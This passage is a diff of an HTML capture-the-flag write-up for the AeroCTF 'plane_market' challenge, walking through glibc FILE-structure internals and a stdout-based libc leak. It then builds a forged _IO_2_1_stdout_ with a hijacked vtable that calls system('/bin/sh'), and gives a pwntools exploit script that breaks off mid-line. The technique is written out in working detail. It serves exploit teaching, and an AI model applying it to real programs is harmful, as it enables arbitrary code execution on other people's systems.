(EBADF);</span><br><span class="line">      <span class="keyword">return</span> EOF;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="comment">/* If currently reading or no buffer allocated. */</span></span><br><span class="line">  <span class="keyword">if</span> ((f-&gt;_flags &amp; _IO_CURRENTLY_PUTTING) == <span class="number">0</span> || f-&gt;_IO_write_base == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">    ... truncated ...</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">if</span> (ch == EOF)</span><br><span class="line">    <span class="keyword">return</span> _IO_do_write (f, f-&gt;_IO_write_base, <span class="comment">// We want this</span></span><br><span class="line">             f-&gt;_IO_write_ptr - f-&gt;_IO_write_base);</span><br></pre></td></tr></table></figure>
 <p>Eventually <strong>_IO_do_write</strong> will be called in this function. <code>stdout-&gt;_flags &amp; _IO_NO_WRITES</code> is set to zero to avoid running some unnecessary code, we do the same for <code>stdout-&gt;_flags &amp; _IO_CURRENTLY_PUTTING</code>.</p>
 <p><code>_IO_new_file_overflow</code> calls <code>_IO_do_write</code> with arguments as <code>stdout</code>, <code>stdout-&gt;_IO_write_base</code> and size of the buffer which is calculated via <code>f-&gt;_IO_write_ptr - f-&gt;_IO_write_base</code>.</p>
-<p>From changelogs we know that <code>_IO_do_write</code> is defined as a macro for <strong>_IO_new_do_write</strong>:<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">versioned_symbol (libc, _IO_new_do_write, _IO_do_write, GLIBC_2_1);</span><br></pre></td></tr></table></figure></p>
+<p>From changelogs we know that <code>_IO_do_write</code> is defined as a macro for <strong>_IO_new_do_write</strong>:</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">versioned_symbol (libc, _IO_new_do_write, _IO_do_write, GLIBC_2_1);</span><br></pre></td></tr></table></figure>
 <p><strong>_IO_new_do_write</strong> will call <strong>new_do_write</strong> with the same parameters (glibc/libio/fileops.c):</p>
 <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span></span><br><span class="line">_IO_new_do_write (FILE *fp, <span class="keyword">const</span> <span class="keyword">char</span> *data, <span class="keyword">size_t</span> to_do)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> (to_do == <span class="number">0</span></span><br><span class="line">      || (<span class="keyword">size_t</span>) new_do_write (fp, data, to_do) == to_do) ? <span class="number">0</span> : EOF;</span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_ver (_IO_new_do_write, _IO_do_write)</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">size_t</span></span><br><span class="line">new_do_write (FILE *fp, <span class="keyword">const</span> <span class="keyword">char</span> *data, <span class="keyword">size_t</span> to_do)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">size_t</span> count;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_flags &amp; _IO_IS_APPENDING)</span><br><span class="line">    <span class="comment">/* On a system without a proper O_APPEND implementation,</span></span><br><span class="line"><span class="comment">       you would need to sys_seek(0, SEEK_END) here, but is</span></span><br><span class="line"><span class="comment">       not needed nor desirable for Unix- or Posix-like systems.</span></span><br><span class="line"><span class="comment">       Instead, just indicate that offset (before and after) is</span></span><br><span class="line"><span class="comment">       unpredictable. */</span></span><br><span class="line">    fp-&gt;_offset = _IO_pos_BAD;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> (fp-&gt;_IO_read_end != fp-&gt;_IO_write_base)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">off64_t</span> new_pos</span><br><span class="line">    = _IO_SYSSEEK (fp, fp-&gt;_IO_write_base - fp-&gt;_IO_read_end, <span class="number">1</span>);</span><br><span class="line">      <span class="keyword">if</span> (new_pos == _IO_pos_BAD)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">      fp-&gt;_offset = new_pos;</span><br><span class="line">    &#125;</span><br><span class="line">  count = _IO_SYSWRITE (fp, data, to_do); <span class="comment">// our aim</span></span><br><span class="line">  ... truncated ...</span><br><span class="line">  <span class="keyword">return</span> count;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 <p>The intention is to skip the <strong>else if</strong> block, to achieve this we need to make this true <code>fp-&gt;_flags &amp; _IO_IS_APPENDING</code>, so we can set the right flags like this</p>
 <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">_flags = <span class="number">0xfbad0000</span>  <span class="comment">// Magic number</span></span><br><span class="line">_flags &amp; = ~_IO_NO_WRITES <span class="comment">// _flags = 0xfbad0000</span></span><br><span class="line">_flags | = _IO_CURRENTLY_PUTTING <span class="comment">// _flags = 0xfbad0800</span></span><br><span class="line">_flags | = _IO_IS_APPENDING <span class="comment">// _flags = 0xfbad1800</span></span><br></pre></td></tr></table></figure>
 <p>All that we have to do is to set <strong>stdout-&gt;_flags</strong> to the value we calculated and partial overwrite <strong>stdout-&gt;_IO_write_base</strong> to make it point somewhere to get a leak.</p>
-<p>Having libc we just need to find a way to get a shell, we can use <code>IO_FILE</code> structure again, but this time instead of entering <code>IO_OVERFLOW</code> we want to actually change its pointer and how we can do this? Each <code>IO_FILE</code> has a vtable that contains multiple saved pointers to functions like <code>IO_OVERFLOW</code>:<br><a data-fancybox="gallery" href="https://i.imgur.com/XWC0ex8.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/XWC0ex8.png" alt><br></a><br>Let’s see the contents of IO_file_jumps vtable:<br><a data-fancybox="gallery" href="https://i.imgur.com/mqUQ3bh.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/mqUQ3bh.png" alt><br></a><br>But <strong>IO_file_jumps</strong> is to far from the <strong>stdout</strong>, to actually change that pointer, it would require us to change a lot of things in memory, instead we can change the vtable pointer to IO_helper_jumps. </p>
-<p>And yes vtables are <strong>writeable</strong> again in libc-2.29 for some reason:<br><a data-fancybox="gallery" href="https://i.imgur.com/iywbYvx.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/iywbYvx.png" alt><br></a><br>Here is the call of <strong>IO_OVERFLOW</strong> at <strong>_IO_new_file_xsputn</strong>:<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">size_t</span></span><br><span class="line">_IO_new_file_xsputn (FILE *f, <span class="keyword">const</span> <span class="keyword">void</span> *data, <span class="keyword">size_t</span> n)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">char</span> *s = (<span class="keyword">const</span> <span class="keyword">char</span> *) data;</span><br><span class="line">  <span class="keyword">size_t</span> to_do = n;</span><br><span class="line">  <span class="keyword">int</span> must_flush = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">size_t</span> count = <span class="number">0</span>;</span><br><span class="line">  ... truncated ...</span><br><span class="line">  <span class="keyword">if</span> (to_do + must_flush &gt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">size_t</span> block_size, do_write;</span><br><span class="line">      <span class="comment">/* Next flush the (full) buffer. */</span></span><br><span class="line">      <span class="keyword">if</span> (_IO_OVERFLOW (f, EOF) == EOF) <span class="comment">// We want to get control of this</span></span><br><span class="line">    <span class="comment">/* If nothing else has to be written we must not signal the</span></span><br><span class="line"><span class="comment">       caller that everything has been written.  */</span></span><br><span class="line">    <span class="keyword">return</span> to_do == <span class="number">0</span> ? EOF : n - to_do;</span><br><span class="line">      ... truncated ...</span><br><span class="line">  <span class="keyword">return</span> n - to_do;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
-<p>The python line to edit the -2 index aka stdout:<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">change_plane_name(<span class="number">-2</span>, p64(<span class="number">0xfbad1800</span>)+<span class="number">3</span>*p64(<span class="number">0</span>))</span><br><span class="line">LEAK = u64(r.recvuntil(<span class="string">'\x7f'</span>)[<span class="number">-6</span>:].ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line">LIBC = LEAK<span class="number">-0x1bc570</span></span><br><span class="line">log.info(<span class="string">'LEAK 0x%x'</span>% LEAK)</span><br><span class="line">log.info(<span class="string">'LIBC 0x%x'</span>% LIBC)</span><br></pre></td></tr></table></figure></p>
+<p>Having libc we just need to find a way to get a shell, we can use <code>IO_FILE</code> structure again, but this time instead of entering <code>IO_OVERFLOW</code> we want to actually change its pointer and how we can do this? Each <code>IO_FILE</code> has a vtable that contains multiple saved pointers to functions like <code>IO_OVERFLOW</code>:<br>
+<a data-fancybox="gallery" href="https://i.imgur.com/XWC0ex8.png" target="_blank" rel="noopener"><br>
+<img src="https://i.imgur.com/XWC0ex8.png" alt><br>
+</a><br>
+Let’s see the contents of IO_file_jumps vtable:<br>
+<a data-fancybox="gallery" href="https://i.imgur.com/mqUQ3bh.png" target="_blank" rel="noopener"><br>
+<img src="https://i.imgur.com/mqUQ3bh.png" alt><br>
+</a><br>
+But <strong>IO_file_jumps</strong> is to far from the <strong>stdout</strong>, to actually change that pointer, it would require us to change a lot of things in memory, instead we can change the vtable pointer to IO_helper_jumps.</p>
+<p>And yes vtables are <strong>writeable</strong> again in libc-2.29 for some reason:<br>
+<a data-fancybox="gallery" href="https://i.imgur.com/iywbYvx.png" target="_blank" rel="noopener"><br>
+<img src="https://i.imgur.com/iywbYvx.png" alt><br>
+</a><br>
+Here is the call of <strong>IO_OVERFLOW</strong> at <strong>_IO_new_file_xsputn</strong>:</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">size_t</span></span><br><span class="line">_IO_new_file_xsputn (FILE *f, <span class="keyword">const</span> <span class="keyword">void</span> *data, <span class="keyword">size_t</span> n)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">char</span> *s = (<span class="keyword">const</span> <span class="keyword">char</span> *) data;</span><br><span class="line">  <span class="keyword">size_t</span> to_do = n;</span><br><span class="line">  <span class="keyword">int</span> must_flush = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">size_t</span> count = <span class="number">0</span>;</span><br><span class="line">  ... truncated ...</span><br><span class="line">  <span class="keyword">if</span> (to_do + must_flush &gt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">size_t</span> block_size, do_write;</span><br><span class="line">      <span class="comment">/* Next flush the (full) buffer. */</span></span><br><span class="line">      <span class="keyword">if</span> (_IO_OVERFLOW (f, EOF) == EOF) <span class="comment">// We want to get control of this</span></span><br><span class="line">    <span class="comment">/* If nothing else has to be written we must not signal the</span></span><br><span class="line"><span class="comment">       caller that everything has been written.  */</span></span><br><span class="line">    <span class="keyword">return</span> to_do == <span class="number">0</span> ? EOF : n - to_do;</span><br><span class="line">      ... truncated ...</span><br><span class="line">  <span class="keyword">return</span> n - to_do;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>The python line to edit the -2 index aka stdout:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">change_plane_name(<span class="number">-2</span>, p64(<span class="number">0xfbad1800</span>)+<span class="number">3</span>*p64(<span class="number">0</span>))</span><br><span class="line">LEAK = u64(r.recvuntil(<span class="string">'\x7f'</span>)[<span class="number">-6</span>:].ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line">LIBC = LEAK<span class="number">-0x1bc570</span></span><br><span class="line">log.info(<span class="string">'LEAK 0x%x'</span>% LEAK)</span><br><span class="line">log.info(<span class="string">'LIBC 0x%x'</span>% LIBC)</span><br></pre></td></tr></table></figure>
 <p>If we leak with success we start building stdout overflow:</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">_IO_2_1_stdout_ = <span class="string">'/bin/sh\x00'</span><span class="comment"># flags</span></span><br><span class="line">_IO_2_1_stdout_ += <span class="number">3</span>*p64(<span class="number">0</span>) <span class="comment"># _IO_read_ptr,_IO_read_end,_IO_read_base</span></span><br><span class="line">_IO_2_1_stdout_ += p64((LIBC+<span class="number">0x1e57e3</span>) &amp; <span class="number">0xffffffffff00</span>) <span class="comment"># _IO_write_base</span></span><br><span class="line">_IO_2_1_stdout_ += p64(LIBC+<span class="number">0x1e57e3</span>) <span class="comment"># _IO_write_ptr</span></span><br><span class="line">_IO_2_1_stdout_ += p64(LIBC+<span class="number">0x1e57e3</span>) <span class="comment"># _IO_write_end</span></span><br><span class="line">_IO_2_1_stdout_ += p64(LIBC+<span class="number">0x1e57e3</span>) <span class="comment"># _IO_buf_base</span></span><br><span class="line">_IO_2_1_stdout_ += p64(LIBC+<span class="number">0x1e57e3</span>+<span class="number">1</span>) <span class="comment"># _IO_buf_end</span></span><br><span class="line">_IO_2_1_stdout_ += p64(<span class="number">0</span>)*<span class="number">4</span></span><br><span class="line">_IO_2_1_stdout_ += p64(LIBC+libc.symbols[<span class="string">'_IO_2_1_stdin_'</span>]) <span class="comment"># _chain</span></span><br><span class="line">_IO_2_1_stdout_ += p32(<span class="number">0x1</span>) <span class="comment"># _fileno</span></span><br><span class="line">_IO_2_1_stdout_ += p32(<span class="number">0x0</span>) <span class="comment"># _flags2</span></span><br><span class="line">_IO_2_1_stdout_ += p64(<span class="number">-0x1</span>, signed=<span class="keyword">True</span>) <span class="comment">#_old_offset</span></span><br><span class="line">_IO_2_1_stdout_ += p16(<span class="number">0x0</span>) <span class="comment"># _cur_column</span></span><br><span class="line">_IO_2_1_stdout_ += p8(<span class="number">0x0</span>) <span class="comment"># _vtable_offset</span></span><br><span class="line">_IO_2_1_stdout_ += p8(<span class="number">0x0</span>) <span class="comment"># _shortbuf</span></span><br><span class="line">_IO_2_1_stdout_ += p32(<span class="number">0x0</span>) <span class="comment"># _shortbuf</span></span><br><span class="line">_IO_2_1_stdout_ += p64(LIBC+libc.symbols[<span class="string">'_IO_2_1_stdout_'</span>]+<span class="number">0x1e20</span>) <span class="comment"># _LOCK</span></span><br><span class="line">_IO_2_1_stdout_ += p64(<span class="number">-0x1</span>, signed=<span class="keyword">True</span>) <span class="comment"># _offset</span></span><br><span class="line">_IO_2_1_stdout_ += p64(<span class="number">0x0</span>) <span class="comment"># _codecvt</span></span><br><span class="line">_IO_2_1_stdout_ += p64(LIBC+libc.symbols[<span class="string">'_IO_2_1_stdout_'</span>]<span class="number">-0xea0</span>) <span class="comment"># _wide_data</span></span><br><span class="line">_IO_2_1_stdout_ += p64(<span class="number">0x0</span>) <span class="comment"># _freeres_list</span></span><br><span class="line">_IO_2_1_stdout_ += p64(<span class="number">0x0</span>) <span class="comment"># _freeres_buf</span></span><br><span class="line">_IO_2_1_stdout_ += p64(<span class="number">0x0</span>) <span class="comment"># __pad5</span></span><br><span class="line">_IO_2_1_stdout_ += p32(<span class="number">-0x1</span>, signed=<span class="keyword">True</span>) <span class="comment"># _mode</span></span><br><span class="line">_IO_2_1_stdout_ += p32(<span class="number">0x0</span>) <span class="comment"># _unused2</span></span><br><span class="line">_IO_2_1_stdout_ += p64(<span class="number">0x0</span>) <span class="comment"># _unused2</span></span><br><span class="line">_IO_2_1_stdout_ += p64(<span class="number">0x0</span>) <span class="comment"># _unused2</span></span><br><span class="line">_IO_2_1_stdout_ += p64(LIBC+libc.symbols[<span class="string">'_IO_2_1_stdout_'</span>]+<span class="number">0x200</span>) <span class="comment"># IO_helper_jumps</span></span><br><span class="line">STDERR = p64(LIBC+libc.symbols[<span class="string">'_IO_2_1_stderr_'</span>]) <span class="comment"># stderr</span></span><br><span class="line">STDOUT = p64(LIBC+libc.symbols[<span class="string">'_IO_2_1_stdout_'</span>]) <span class="comment"># stdout</span></span><br><span class="line">STDIN = p64(LIBC+libc.symbols[<span class="string">'_IO_2_1_stdin_'</span>]) <span class="comment"># stdin</span></span><br><span class="line">INPUT = _IO_2_1_stdout_+STDERR+STDIN+STDOUT+p64(<span class="number">0</span>)*<span class="number">2</span>*<span class="number">17</span>+p64(<span class="number">0</span>)+p64(LIBC+<span class="number">0x80650</span>)+p64(LIBC+libc.symbols[<span class="string">'system'</span>])</span><br><span class="line">change_plane_name(<span class="number">-2</span>, INPUT, <span class="keyword">False</span>)</span><br></pre></td></tr></table></figure>
 <p>After this we can get a shell pops the full exploit:</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">host, port = <span class="string">"tasks.aeroctf.com"</span>, <span class="string">"33087"</span></span><br><span class="line">filename = <span class="string">"./plane_marketbkup"</span></span><br><span class="line"><span class="comment">#filename = "./plane_market"</span></span><br><span class="line"></span><br><span class="line">elf = ELF(filename)</span><br><span class="line">context.arch = <span class="string">'amd64'</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#if not args.REMOTE:</span></span><br><span class="line"><span class="comment">#    libc = elf.libc</span></span><br><span class="line"><span class="comment">#else:</span></span><br><span class="line">libc = ELF(<span class="string">'./libc.so.6'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getConn</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">return</span> process(filename, env=&#123;<span class="string">"LD_PRELOAD"</span>:<span class="string">"./libc.so.6"</span>&#125;) <span class="keyword">if</span> <span class="keyword">not</span> args.REMOTE <span class="keyword">else</span> remote(host, port)</span><br><span class="line">    <span class="comment">#return process(filename) if not args.REMOTE else remote(host, port)</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_PIE</span><span class="params">(proc)</span>:</span></span><br><span class="line">    memory_map = open(<span class="string">"/proc/&#123;&#125;/maps"</span>.format(proc.pid),<span class="string">"rb"</span>).readlines()</span><br><span class="line">    <span class="keyword">return</span> int(memory_map[<span class="number">0</span>].split(<span class="string">"-"</span>)[<span class="number">0</span>],<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span><span class="params">(bp)</span>:</span></span><br><span class="line">    script = <span class="string">""</span></span><br><span class="line">    PIE = get_PIE(r)</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> bp:</span><br><span class="line">        script += <span class="string">"b *0x%x\n"</span>%(x)</span><br><span class="line">    gdb.attach(r,gdbscript=script)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(psize,name,cost,yn, size=<span class="number">0</span>, comm=<span class="string">""</span>)</span>:</span></span><br><span class="line">    r.sendlineafter(<span class="string">'&gt; '</span>, <span class="string">'1'</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">'Enter name size: '</span>,str(psize))</span><br><span class="line">    r.sendlineafter(<span class="string">'Enter plane name: '</span>,name)</span><br><span class="line">    r.sendlineafter(<span class="string">'Enter plane cost: '</span>,str(cost))</span><br><span class="line">    r.sendlineafter(<span class="string">'Do you wanna leave a comment? [Y\\N]: '</span>,yn) </span><br><span class="line">    <span class="keyword">if</span> yn == <span class="string">'Y'</span>:</span><br><span class="line">        r.sendlineafter(<span class="string">'Enter comment size: '</span>, str(size))</span><br><span class="line">        r.sendlineafter(<span class="string">'Comment: '</span>,comm)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(pid)</span>:</span></span><br><span class="line">    r.sendlineafter(<span class="string">'&gt; '</span>, <span class="string">'2'</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">'Enter plane id: '</span>,str(pid))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">view_list</span><span class="params">()</span>:</span></span><br><span class="line">    r.sendlineafter(<span class="string">'&gt; '</span>, <span class="string">'3'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">view_plane</span><span class="params">(pid)</span>:</span></span><br><span class="line">    r.sendlineafter(<span class="string">'&gt; '</span>, <span class="string">'4'</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">'Enter plane id: '</span>, str(pid))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">change_plane_name</span><span class="params">(pid, name, nl=True)</span>:</span></span><br><span class="line">    r.sendlineafter(<span class="string">'&gt; '</span>, <span class="string">'5'</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">'Enter plane id: '</span>, str(pid))</span><br><span class="line">    <span class="keyword">if</span> nl:</span><br><span class="line">        r.sendlineafter(<span class="string">'Enter new plane name: '</span>, name)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        r.sendafter(<span class="string">'Enter new plane name: '</span>, name)</span><br><span class="line"></span><br><span class="line">context.terminal = [<span class="string">'tmux'</span>, <span class="string">'new-window'</span>]</span><br><span class="line"><span class="comment">#for i in range(0x1000):</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exploit</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">global</span> r</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        r = getConn()</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> args.REMOTE <span class="keyword">and</span> args.GDB:</span><br><span class="line">            debug([<span class="number">0x401363</span>,<span class="number">0x4013ED</span>,<span class="number">0x401bc7</span>,<span class="number">0x40139F</span>])<span class="comment">#0x40145C,0x40148C,0x4011EC])</span></span><br><span class="line">        r.sendlineafter(<span class="string">'Enter name: '</span>,<span class="string">'%x'</span>)</span><br><span class="line">        change_plane_name(<span class="number">-2</span>, p64(<span class="number">0xfbad1800</span>)+<span class="number">3</span>*p64(<span class="number">0</span>))</span><br><span class="line">        <span class="comment">#context.log_level='debug'</span></span><br><span class="line">        LEAK = u64(r.recvuntil(<span class="string">'\x7f'</span>)[<span class="number">-6</span>:].ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line">        LIBC = LEAK<span class="number">-0x1bc570</span></span><br><span class="line">        log.info(<span class="string">'LEAK 0x%x'</span>% LEAK)</span><br><span class="line">        log.info(<span class="string">'LIBC 0x%x'</span>% LIBC)</span><br><span class="line">        _IO_2_1_stdout_ = <span class="string">'/bin/sh\x00'</span><span class="comment">#p64(0xfbad1800)</span></span><br><span class="line">        _IO_2_1_stdout_ += <span class="number">3</span>*p64(<span class="number">0</span>)</span><br><span class="line">        _IO_2_1_stdout_ += p64((LIBC+<span class="number">0x1e57e3</span>) &amp; <span class="number">0xffffffffff00</span>) <span class="comment"># _IO_write_base</span></span><br><span class="line">        _IO_2_1_stdout_ += p64(LIBC+<span class="number">0x1e57e3</span>) <span class="comment"># _IO_write_ptr</span></span><br><span class="line">        _IO_2_1_stdout_ += p64(LIBC+<span class="number">0x1e57e3</span>) <span class="comment"># _IO_write_end</span></span><br><span class="line">        _IO_2_1_stdout_ += p64(LIBC+<span class="number">0x1e57e3</span>) <span class="comment"># _IO_buf_base</span></span><br><span class="line">        _IO_2_1_stdout_ += p64(LIBC+<span class="number">0x1e57e3</span>+<span class="number">1</span>) <span class="comment"># _IO_buf_end</span></span><br><span class="line">        _IO_2_1_stdout_ += p64(<span class="number">0</span>)*<span class="number">4</span></span><br><span class="line">        _IO_2_1_stdout_ += p64(LIBC+libc.symbols[<span class="string">'_IO_2_1_stdin_'</span>]) <span class="comment"># _chain</span></span><br><span class="line">        _IO_2_1_stdout_ += p32(<span class="number">0x1</span>) <span class="comment"># _fileno</span></span><br><span class="line">        _IO_2_1_stdout_ += p32(<span class="number">0x0</span>) <span class="comment"># _flags2</span></span><br><span class="line">        _IO_2_1_stdout_ += p64(<span class="number">-0x1</span>, signed=<span class="keyword">True</span>) <span class="comment">#_old_offset</span></span><br><span class="line">        _IO_2_1_stdout_ += p16(<span class="number">0x0</span>) <span class="comment"># _cur_column</span></span><br><span class="line">        _IO_2_1_stdout_ += p8(<span class="number">0x0</span>) <span class="comment"># _vtable_offset</span></span><br><span class="line">        _IO_2_1_stdout_ += p8(<span class="number">0x0</span>) <span class="comment"># _shortbuf</span></span><br><span class="line">        _IO_2_1_stdout_ += p32(<span class="number">0x0</span>) <span class="comment"># _shortbuf</span></span><br><span class="line">        _IO_2_1_stdout_ += p64(LIBC+libc.symbols[<span class="string">'_IO_2_1_stdout_'</span>]+<span class="number">0x1e20</span>) <span class="comment"># _LOCK</span></span><br><span class="line">        _IO_2_1_stdout_ += p64(<span class="number">-0x1</span>, signed=<span class="keyword">True</span>) <span class="comment"># _offset</span></span><br><span 